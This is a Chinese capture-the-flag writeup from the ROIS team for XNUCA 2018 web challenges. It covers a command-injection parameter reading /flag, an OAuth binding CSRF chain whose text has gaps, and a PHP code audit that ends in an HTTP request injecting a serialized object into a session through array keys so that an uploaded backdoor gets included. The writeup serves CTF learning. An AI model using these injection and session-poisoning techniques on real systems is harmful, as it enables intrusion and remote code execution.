# XNUCA 2018 预赛 ROIS Writeup
## WEB
### ezdotso
生活总是充满惊喜的。永远相信，美好的事情即将发生。
——尤其是当主办方环境配置错误的情况下，从没有人会想到，`&action=cmd&cmd=cat%20/flag`是如此美妙。
### Blog
you can login in the blog services by your username or auth by auth2.0, try to
hack it.  
提交的链接只允许  开头, 并且长度有限制  
已登录用户可以通过下面任意跳转  
未绑定oauth的用户可以点击绑定跳转到绑定界面  
但是返回链接没有对用户做确认. 只要点击绑定返回的连接 就会被绑定成
攻击链:
  1. 建立一个 oauth 账号
  2. 建立一个 blog 账号
  3. 点击绑定新账号, 使用 burp 拦截回调链接
  4. 在自己的服务器写下如下代码
         给管理员
  6. 使用oauth 重新登录 blog 即成为管理员
### hardphp
题目要求是Get Shell，因此考虑一切能直接执行代码的方案。先从/www.zip扫描危险函数，发现没有，所以只能考虑include等方案。
先进入后台，发现只有登录，没有注册，因此开始源码审计。从/www.zip 拿到源码后，发现注册接口：/user/register，因此注册用户，进入后台。
发现上传接口：
  1. 可以上传.php，但文件名被随机化了。
  2. 因为.htaccess `php_flag engine off;`的缘故，无法执行代码。
  3. 代码审计，发现路径不可控，无法覆盖任意文件或Session。
继续代码审计。从include的角度发现：
  1. 其注册了一个`autoload`接口，这之内有全场唯一的一个include。
  2. `autoload`的文件路径可控，但文件名（即类名）是否可控未知。
  3. 考虑Get Shell，猜测类名可控。发现通过控制Controller的值可以部分控制类名，这完全没用，除非上传文件名可控。
  4. 通过反序列化可以加载一个新类，如果反序列化值可控，则此处就可以直接include上传的文件。
    $__action     = isset($_GET['a']) ? strtolower($_GET['a']) : 'index';
    $__custom    = isset($_GET['s']) ? strtolower($_GET['s']) : 'custom';
    spl_autoload_register('inner_autoload');
    function inner_autoload($class){
        GLOBAL $__module,$__custom, $list;
        foreach(array('model','include','controller'.(empty($__module)?'':DS.$__module),$__custom) as $dir){
            $file = APP_DIR.DS.$dir.DS.$class.'.php';
            if(file_exists($file)){
                include $file;
                return;
            }
        }
    }
因此，考虑反序列化。从反序列化的角度发现：
  1. 所有的`unserialize`均被加入了`allowed_classes`，因此不能利用。
  2. Session不存在文件里，而是从数据库直接读写。
我们的思路现在很已经非常明确了，这也可能是本题唯一的通向RCE的方法：先上传文件，取得后门文件的文件名，之后通过某种手段将恶意序列化内容写入Session，再通过可控文件路径让autoload
include到我们刚才上传的文件即可。
某种手段是什么呢？
既然到数据库，就寻找注入点。代码审计。全局搜索SELECT、INSERT、UPDATE，发现它所有的输入点（看起来）都没过滤，只是尝试注入无果，后发现一个简易WAF：
    escape($_REQUEST);
    escape($_POST);
    escape($_GET);
    escape($_SERVER);
    function escape(&$arg) {
        if(is_array($arg)) {
            foreach ($arg as &$value) {
                escape($value);
            }
        } else {
            $arg = str_replace(["'", '\\', '(', ')'], ["‘", '\\\\', '（', '）'], $arg);
        }
    }
比较有毒的是，第一次看到把`$_SERVER`也WAF的题目。事情到这里似乎陷入了僵局，毕竟找不到注入点。但是一般人会把Session存入数据库吗？这里一定有玄机。我们找找SESSION存取的相关代码，很容易就能找到，在`/user/login`处对SESSION进行了赋值。
    $username = arg('username');
    $password = arg('password');
    $ip = arg('REMOTE_ADDR');
    $userAgent = arg('HTTP_USER_AGENT');
    // ...
    $session = new Session($res[0]["id"],time(),$ip,$userAgent);
    $_SESSION['data'] = serialize($session);
    $_SESSION['username'] = $username;
    $this->jump("/main/index");
——注意到此处有`serialize`函数，它能把一个数组包括Key在内都转换成一个字符串，而上述WAF函数并没有对Key进行过滤。那这几个参数可以变成数组吗？
当然可以。注意此处的User-Agent. User-Agent是从头里拿的，我们无法让`$_SERVER['HTTP_USER_AGENT']`变成数组，怎么办呢？
看看`arg`函数：
    function arg($name, $default = null, $trim = false) {
        if (isset($_REQUEST[$name])) {
            $arg = $_REQUEST[$name];
        } elseif (isset($_SERVER[$name])) {
            $arg = $_SERVER[$name];
        } else {
            $arg = $default;
        }
        if($trim) {
            $arg = trim($arg);
        }
        return $arg;
    }
因此，只要是POST就行了，没人管他是不是头啦。PHP的POST是支持`a[key]=value`写法的，因此POST一个`HTTP_USER_AGENT[']=1`。先在本地试试看。
    POST /main/login HTTP/1.1
    Host: 172.16.123.1:8001
    Content-Length: 49
    Cache-Control: max-age=0
    Origin: http://172.16.123.1:8001
    Upgrade-Insecure-Requests: 1
    DNT: 1
    Content-Type: application/x-www-form-urlencoded
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
    Referer: http://172.16.123.1:8001/main/login
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,ja;q=0.7
    Cookie: PHPSESSID=49cb2d038a2ae214ae1461df36c0ebc7
    Connection: close
    username=a&password=123456&HTTP_USER_AGENT['cy|O:32:"ohf7lr1g3wr2zojy2icg5djfof8jk60u":1:{s:1:"a";s:3:"111";}';#]=1